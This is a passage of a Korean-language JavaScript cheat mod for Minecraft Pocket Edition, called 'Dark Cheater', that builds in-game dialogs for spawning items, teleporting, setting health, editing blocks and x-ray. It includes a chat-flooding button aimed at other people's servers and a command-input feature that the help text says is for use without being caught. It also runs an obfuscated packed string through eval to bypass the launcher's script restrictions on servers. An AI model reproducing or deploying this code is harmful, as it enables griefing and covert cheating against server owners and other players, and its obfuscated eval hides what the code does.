onClick: function(v){
gameSpeed();
}
});
button[9].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(!Dark.isMulti()){
for(var n=0;n<chatTerrorN;n++){
if(showNumber) net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat((n+1)+". "+chatTerrorString);
else net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(chatTerrorString);
}
}
else if(Dark.isMulti()){
if(chatTerrorCool){
if(chatTerrorN>5){
chatTerrorN = 5;
Dark.toast("타인의 서버에서는 6회 이상 반복할 수 없습니다.");
}
for(var n=0;n<chatTerrorN;n++){
if(showNumber) net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat((n+1)+". "+chatTerrorString);
else net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(chatTerrorString);
if(fixSendChat){
if(showNumber) clientMessage("<"+Player.getName(ad)+"> "+(n+1)+". "+chatTerrorString);
else clientMessage("<"+Player.getName(ad)+"> "+chatTerrorString);
}
}
chatTerrorCool = false;
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(10000);
chatTerrorCool = true;
}
}).start();
}
else{
Dark.toast("타인의 서버에서는 쿨타임 10초가 적용됩니다.");
}
}
}
});
button[9].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
chatTerrorSetting();
return true;
}
});
if(music) button[4].setText("음악 정지");
for(var n in menus)
layout.addView(button[n]);

var btns = new Array();
var setting = ["고스트핵", "카디널", "이벤트 함수 호출 시작", "추가 기능", "도움말", "서버원 모드", "게임 종료"];
for(var n in setting)
btns[n] = makeButton(setting[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
ghostHack();
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.save("cardinal", true);
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(eventPass){
evData.a = Server.getAddress();
evData.p = Server.getPort();
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v 8=q["\\g\\4\\b\\c\\t\\1\\9\\g\\4\\0\\a\\e"]["\\k\\3\\7\\1\\2\\0\\b\\a\\3\\4\\1\\5"]["\\f\\3\\5\\9\\7\\6\\h\\0\\a\\0\\e\\1\\5"];8["\\2\\1\\0\\l\\1\\m\\0\\k\\1\\n\\0\\2\\2\\o\\0\\3\\p"](i);8["\\3\\0\\2\\2\\f\\3\\5\\9\\7\\6\\h\\1\\6\\4\\c\\r"]("s",[i,j]);u(d||w)d=j;',33,33,'x61|x65|x6C|x63|x68|x72|x74|x70|eventFunc|x69|x6E|x75|x6F|scriptEnable|x67|x53|x7A|x4D|true|false|x6D|x76|x47|x43|x62|x6B|net|x64|newLevel|x77|if|var|scriptEnable2'.split('|'),0,{});
eval(code);
Dark.toast("이벤트 함수가 호출되기 시작합니다.\n Server.getAddress();와 nServer.getPort();, 서버에서의 명령어를 사용할 수 없습니다.");
if(modTickOnoff){
modTickOnoff = false;
Dark.toast("modTick 강제호출이 종료됩니다.");
}
}
else{
eventPassDialog();
}
}
});
btns[2].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
net.zhuoweizhang.mcpelauncher.ScriptManager.callScriptMethod("leavaGame", []);
net.zhuoweizhang.mcpelauncher.ScriptManager.rakNetConnectCallback(evData.a.toString(), Number(evData.p));
Dark.toast("이벤트 함수 호출이 정지합니다.\n Server.getAddress();와 nServer.getPort();, 서버에서의 명령어를 사용할 수 있습니다.");
return true;
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
openPlus();
}
});
btns[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.showDialog("도움말", "스크립트 이름 : Dark Cheater\n제작자 : Dark Tornado\n스크립트 버전 : "+version+"\n스크립트 최신 버전 : "+Dark.getNewestVersion()+"\n마인크래프트 버전 : "+ModPE.getMinecraftVersion()+"\n블록런처 버전 : "+ModPE.getBlocklauncherVersion(false)+"\n블록런처 프로 버전 : "+ModPE.getBlocklauncherVersion(true)+"\n\n사용법은 버튼들만 보셔도 아실 것 같습니다(¿믕).버튼을 누르시면 토스트 메시지로 안내사항(?) 같은 것이 뜹니다. 엔티티 스폰은 해당 엔티티를 선택하고, 원하는 곳을 터치하면 스폰됩니다. 서버원 모드에서는 스폰알로 스폰합니다. 서버원 모드는 서버장 모드 중 서버원이 키고 들어가도 정상적으로 작동하는 기능들만 넣은겁니다. \"채우기\"의 사용법은 가위로 지점 1, 2를 설정(터치)한 뒤, 원하는 블록으로 터치하시면 됩니다. \"명령어 입력\"버튼은 서버원으로 들어가서 명령어를 치면 들키기 때문에 몰래 사용할 때 사용하라고 있는 것으로, 앞에 \"\/\"는 빼고 입력해야 합니다.\n테러 방지 옵션의 \"블록 파괴 방지\"는 블록을 캘 때 드럽게 천천히 캐지는 기능입니다. 서버장 포함이 비활성화인 경우, 서버장은 TNT를 사용할 수 있습니다.\n\"창고 잠금\"은 0.10.5에서만 작동합니다.\nUI를 바꾸어도 다크 치터는 그다지 많은 영향을 받지 않습니다.\n\"고스트핵\"과 \"추가 기능\"들 중 일부는 서버원 모드에서 정상적으로 작동하지 않습니다.\n\"고스트핵\"은 고스트핵에는 있지만, 다크 치터에는 없는 기능들이 들어있고, \"야간 투시\"은 잘 작동하지 않으며 얼음이 녹을 수 있습니다.\n\"연속 채팅 방지\"는 1초에 두 번 이상 채팅을 할 수 없도록 하는 기능으로, 해당 서버원의 폰에서는 채팅을 한 것으로 되나, 서버장의 폰에서는 채팅이 뜨지 않습니다. \"연속 채팅 방지\"에 의해 막힌 채팅 내용도 \"대화 내용 보기\"에서 확인하실 수 있습니다.\n", true);
}
});
btns[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(true);
if(cross!=null){
cross.dismiss();
cross = null;
}
Dark.toast("서버원 모드가 되었습니다.");
multi = true;
}
});
btns[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
ModPE.leaveGame();
Dark.toast("Quit to Title");
}
});
btns[6].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
ModPE.leaveGame();
//return값 없어서 마크 팅긴다!!!!!
}
});
if(!tf){
btns[7] = new android.widget.Button(ctx);
btns[7].setText("서버장 모드");
btns[7].setBackgroundDrawable(setBtnColor());
btns[7].setTextColor(white2);
btns[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
Dark.close(true);
if(cross!=null){
cross.dismiss();
cross = null;
}
Dark.toast("서버장 모드가 되었습니다.");
multi = false;
}
});
}
if(tf){
for(var n in setting)
layout.addView(btns[n]);
}
else{
layout.addView(btns[0]);
layout.addView(btns[2]);
layout.addView(btns[3]);
layout.addView(btns[4]);
layout.addView(btns[7]);
layout.addView(btns[6]);
}
var exit = makeExit(menuEL);
layout.addView(exit);
var scroll = makeScroll(layout, menuEL);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuEL.setContentView(layout2);
menuEL.showAtLocation(ctx.getWindow().getDecorView(),android.view.Gravity.CENTER|android.view.Gravity.CENTER, 0, 0);
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function addItem(tf, arr, tf2){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("아이템 아이디를 입력하세요");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("아이템 개수 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("아이템 개수를 입력하세요");
loc4.setTextColor(white);
loc4.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
if(Level.getGameMode()==1&&tf2!=true)
loc4.setText(5+"");
loc5.setText("아이템 데미지 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("아이템 데미지를 입력하세요");
loc6.setTextColor(white);
loc6.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("아이템 지급/설정");
dialog.setNegativeButton("취소", null);
if(!tf&&(Level.getGameMode()==0||tf2))
dialog.setNeutralButton("바로 지급", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
addItemInventory(loc2.getText(), loc4.getText(), loc6.getText());
Dark.toast("지급되었습니다.");
}
}));
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(arr==null){
if(tf==false){
if(Level.getGameMode()==1&&tf2!=true){
Entity.setCarriedItem(Player.getEntity(), loc2.getText(), 5, loc6.getText());
}
else{
add.i = loc2.getText();
add.c = loc4.getText();
add.d = loc6.getText();
Dark.toast("터치하시면 지급됩니다.");
adding = 1;
}
}
else if(tf==true){
Level.dropItem(Entity.getX(playerTarget), Entity.getY(playerTarget), Entity.getZ(playerTarget), 0, loc2.getText(), loc4.getText(), loc6.getText());
Dark.toast("지급되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"에게 아이템이 지급되었습니다.", true);
}
}
else{
for each(var pp in arr)
Level.dropItem(Entity.getX(pp), Entity.getY(pp), Entity.getZ(pp), 0, loc2.getText(), loc4.getText(), loc6.getText());
Dark.toast("지급되었습니다.");
}
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function timeDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("시간 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("시간을 입력하세요");
loc2.setTextColor(white);
loc2.setInputType(number);
loc2.setText(Level.getTime()+"");
layout.addView(loc1);
layout.addView(loc2);
var time = new android.widget.SeekBar(ctx);
if(mcpev2) time.setMax(24000);
else time.setMax(19200);
time.setProgress(Level.getTime());
time.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
loc2.setText(seek.getProgress()+"");
}
}));
layout.addView(time);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(0);
layout2.setGravity(android.view.Gravity.CENTER);
var button = new Array();
var menus = [" 일출 ", " 낮 ", " 일몰 ", " 밤 "];
for(var n in menus){
button[n] = new android.widget.Button(ctx);
button[n].setText(menus[n]);
}
button[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
loc2.setText("0");
time.setProgress(0);
}
});
button[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
loc2.setText("1000");
time.setProgress(500);
}
});
button[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
if(mcpev2){
loc2.setText("13500");
time.setProgress(13500);
}
else{
loc2.setText("9600");
time.setProgress(9600);
}
}
});
button[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
loc2.setText("14000");
time.setProgress(14000);
}
});
for(var n in menus)
layout2.addView(button[n]);
layout.addView(layout2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("시간 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
Level.setTime(loc2.getText());
Dark.toast("시간이 "+loc2.getText()+"으로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function playerHealth(arr){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("체력 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("체력을 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("체력 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(arr==null){
Entity.setHealth(playerTarget, loc2.getText());
if(pca) darkMessage(Player.getName(playerTarget)+"의 체력이 "+loc2.getText()+"(으)로 설정되었습니다.", true);
}
else{
for each(var pp in arr)
Entity.setHealth(pp, loc2.getText());
}
Dark.toast("체력이 "+loc2.getText()+"(으)로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function playerTp(arr){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);

var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc1.setText("X : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("x좌표를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
loc3.setText("Y : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("y좌표를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
loc5.setText("Z : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("z좌표를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("플레이어 이동");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
if(arr==null){
if(playerTarget==ad){
Entity.setPosition(ad, loc2.getText(), loc4.getText(), loc6.getText());
}
else{
teleport(playerTarget, loc2.getText(), loc4.getText(), loc6.getText());
if(pca) darkMessage(Player.getName(playerTarget)+"(이)가 ("+loc2.getText()+", "+loc4.getText()+", "+loc6.getText()+")로 이동되었습니다.", true);
}
}
else{
for each(var pp in arr)
teleport(pp, loc2.getText(), loc4.getText(), loc6.getText());
}
Dark.toast("이동되었습니다("+loc2.getText()+", "+loc4.getText()+", "+loc6.getText()+").");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function gameSpeed(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("게임 속도 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("게임 속도를 입력하세요");
loc2.setTextColor(white);
loc2.setText("1");
loc2.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_DECIMAL);
layout.addView(loc1);
layout.addView(loc2);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("게임 속도 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
ModPE.setGameSpeed(20*Number(loc2.getText()));
Dark.toast("게임속도가 "+Number(loc2.getText())+"배속으로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function firstPoint(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var p1x = new android.widget.EditText(ctx);
var p1y = new android.widget.EditText(ctx);
var p1z = new android.widget.EditText(ctx);
p1x.setHint("x좌표");
p1y.setHint("y좌표");
p1z.setHint("z좌표");
p1x.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
p1y.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
p1z.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
var p1h = new android.widget.Button(ctx);
p1h.setText("플레이어(머리)의 좌표로 설정");
p1h.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
p1x.setText(Math.floor(Entity.getX(ad))+"");
p1y.setText(Math.floor(Entity.getY(ad))+"");
p1z.setText(Math.floor(Entity.getZ(ad))+"");
}
});
var p1t = new android.widget.Button(ctx);
p1t.setText("터치한 곳의 좌표로 설정");
p1t.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
xyzTarget = 1;
Dark.toast("취소 버튼을 누르시고, 지점 1이 될 곳을 터치하세요.");
dialog = null;
}
});
layout.addView(p1x);
layout.addView(p1y);
layout.addView(p1z);
layout.addView(p1h);
layout.addView(p1t);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("지점 1 선택");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
we.x[0] = p1x.getText();
we.y[0] = p1y.getText();
we.z[0] = p1z.getText();
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}


function secondPoint(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var p2x = new android.widget.EditText(ctx);
var p2y = new android.widget.EditText(ctx);
var p2z = new android.widget.EditText(ctx);
p2x.setHint("x좌표");
p2y.setHint("y좌표");
p2z.setHint("z좌표");
p2x.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
p2y.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
p2z.setInputType(number|android.text.InputType.TYPE_NUMBER_FLAG_SIGNED);
var p2h = new android.widget.Button(ctx);
p2h.setText("플레이어(머리)의 좌표로 설정");
p2h.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
p2x.setText(Math.floor(Entity.getX(ad))+"");
p2y.setText(Math.floor(Entity.getY(ad))+"");
p2z.setText(Math.floor(Entity.getZ(ad))+"");
}
});
var p2t = new android.widget.Button(ctx);
p2t.setText("터치한 곳의 좌표로 설정");
p2t.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(v){
xyzTarget = 2;
Dark.toast("취소 버튼을 누르시고, 지점 2가 될 곳을 터치하세요.");
}
});
layout.addView(p2x);
layout.addView(p2y);
layout.addView(p2z);
layout.addView(p2h);
layout.addView(p2t);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("지점 2 선택");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
we.x[1] = p2x.getText();
we.y[1] = p2y.getText();
we.z[1] = p2z.getText();
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}


function setDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("블록 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("블록 아이디를 입력하세요");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("블록 데미지 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("블록 데미지를 입력하세요");
loc4.setTextColor(white);
loc4.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("블록 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
var x1, x2, y1, y2, z1, z2;
x1 = Math.min(we.x[0], we.x[1]);
y1 = Math.min(we.y[0], we.y[1]);
z1 = Math.min(we.z[0], we.z[1]);
x2 = Math.max(we.x[0], we.x[1]);
y2 = Math.max(we.y[0], we.y[1]);
z2 = Math.max(we.z[0], we.z[1]);
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
setTile(xx, yy, zz, loc2.getText(), loc4.getText());
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}


function replaceDialog(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
layout.setGravity(android.view.Gravity.CENTER);

var loc0 = new android.widget.TextView(ctx);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.TextView(ctx);
var loc7 = new android.widget.EditText(ctx);
var loc8 = new android.widget.TextView(ctx);
var loc9 = new android.widget.EditText(ctx);

loc0.setText("이 블록(들)을");
loc0.setTextColor(white);
loc1.setText("블록 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("블록 아이디를 입력하세요");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("블록 데미지 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("블록 데미지를 입력하세요");
loc4.setTextColor(white);
loc4.setInputType(number);
loc5.setText("\n이 블록(들)으로");
loc5.setTextColor(white);
loc6.setText("블록 아이디 : ");
loc6.setTextSize(18);
loc6.setTextColor(white);
loc7.setHint("블록 아이디를 입력하세요");
loc7.setInputType(number);
loc7.setTextColor(white);
loc8.setText("블록 데미지 : ");
loc8.setTextSize(18);
loc8.setTextColor(white);
loc9.setHint("블록 데미지를 입력하세요");
loc9.setTextColor(white);
loc9.setInputType(number);

layout.addView(loc0);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
layout.addView(loc7);
layout.addView(loc8);
layout.addView(loc9);

var scroll = android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("블록변경");
if(tf) dialog.setTitle("바꾸기");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick: function(v){
var x1, x2, y1, y2, z1, z2;
if(tf){
x1 = Math.min(w.x[0], w.x[1]);
y1 = Math.min(w.y[0], w.y[1]);
z1 = Math.min(w.z[0], w.z[1]);
x2 = Math.max(w.x[0], w.x[1]);
y2 = Math.max(w.y[0], w.y[1]);
z2 = Math.max(w.z[0], w.z[1]);
}
else{
x1 = Math.min(we.x[0], we.x[1]);
y1 = Math.min(we.y[0], we.y[1]);
z1 = Math.min(we.z[0], we.z[1]);
x2 = Math.max(we.x[0], we.x[1]);
y2 = Math.max(we.y[0], we.y[1]);
z2 = Math.max(we.z[0], we.z[1]);
}
for(var xx=x1;xx<x2+1;xx++)
for(var yy=y1;yy<y2+1;yy++)
for(var zz=z1;zz<z2+1;zz++)
if(getTile(xx, yy, zz)==loc2.getText()){
if(loc4.getText()==""){
setTile(xx, yy, zz, loc7.getText(), loc9.getText());
}
else{
if(Level.getData(xx, yy, zz)==loc4.getText()){
setTile(xx, yy, zz, loc7.getText(), loc9.getText());
}
}
}
Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
clientMessaeg(e+", "+e.lineNumber);
}
}
}));
}


function makeScreenShotButton(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
btnSS = new android.widget.PopupWindow();
var layout = new android.widget.RelativeLayout(ctx);
var button = new android.widget.Button(ctx);
button.setText("SS");
button.setBackgroundColor(android.graphics.Color.argb(70, 0, 0, 0));
button.setTextColor(white);
button.setOnClickListener(new android.view.View.OnClickListener({
onClick: function(v){
net.zhuoweizhang.mcpelauncher.ScriptManager.takeScreenshot("Dark_Capture");
Dark.toast("화면이 캡쳐되었습니다.");
}
}));
setDragListener(btnSS, button, 2);
layout.addView(button);
btnSS.setContentView(layout);
btnSS.setWidth(dip2px(ctx, 50));
btnSS.setHeight(dip2px(ctx, 40));
btnSS.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(70, 0, 0, 0)));
if(Dark.read("sBtnX")=="")
btnSS.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, 2, 180);
else btnSS.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|android.view.Gravity.TOP, Dark.read("sBtnX"), Dark.read("sBtnY"));
}
catch(e){
clientMessage(e+", "+e.lineNumber);
}
}
}));
}


function xRayOn(tf){
if(tf==true){
xrays = [Math.round(Player.getX()-0.5), Player.getY(), Math.round(Player.getZ()-0.5)];
xrays[3] = getTile(xrays[0], xrays[1], xrays[2]);
xrays[4] = Level.getData(xrays[0], xrays[1], xrays[2]);
xrays[5] = getTile(xrays[0], xrays[1]-1, xrays[2]);
xrays[6] = Level.getData(xrays[0], xrays[1]-1, xrays[2]);
setTile(xrays[0], xrays[1], xrays[2], 89);
setTile(xrays[0], xrays[1]-1, xrays[2], 89);
xRay = true;
}
else if(tf==false){
setTile(xrays[0], xrays[1], xrays[2], xrays[3], xrays[4]);
setTile(xrays[0], xrays[1]-1, xrays[2], xrays[5], xrays[6]);
xRay = false;
}

}


function makeTwoBtn(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
btnR = new android.widget.PopupWindow();
btnF = new android.widget.PopupWindow();
var layout1 = new android.widget.RelativeLayout(ctx);
var layout2 = new android.widget.RelativeLayout(ctx);
var rw = new android.widget.ToggleButton(ctx);
var zoom = new android.widget.ToggleButton(ctx);
rw.setTextOn("Run");
rw.setTextOff("Walk");
zoom.setTextOn("Zoom");
zoom.setTextOff("Zoom");
rw.setTextColor(white);
zoom.setTextColor(white);
rw.setChecked(run);
zoom.setChecked(false);
rw.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
run = true;
rt = 4;
}
else if(onoff==false){
run = false;
rt = 0;
}
}
}));
zoom.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
ModPE.setFov(15);
}
else if(onoff==false){
ModPE.resetFov();
}
}
}));
setDragListener(btnR, rw, 1);
setDragListener(btnF, zoom, 1);
layout1.addView(rw);
layout2.addView(zoom);
btnR.setContentView(layout1);
btnR.setWidth(dip2px(ctx, 70));
btnR.setHeight(dip2px(ctx, 40));
btnR.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
btnF.setContentView(layout2);
btnF.setWidth(dip2px(ctx, 70));
btnF.setHeight(dip2px(ctx, 40));
btnF.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
if(Dark.read("btnDist")==""){
btnR.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.TOP, -210, 0);
btnF.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER|android.view.Gravity.TOP, 210, 0);
}
else{
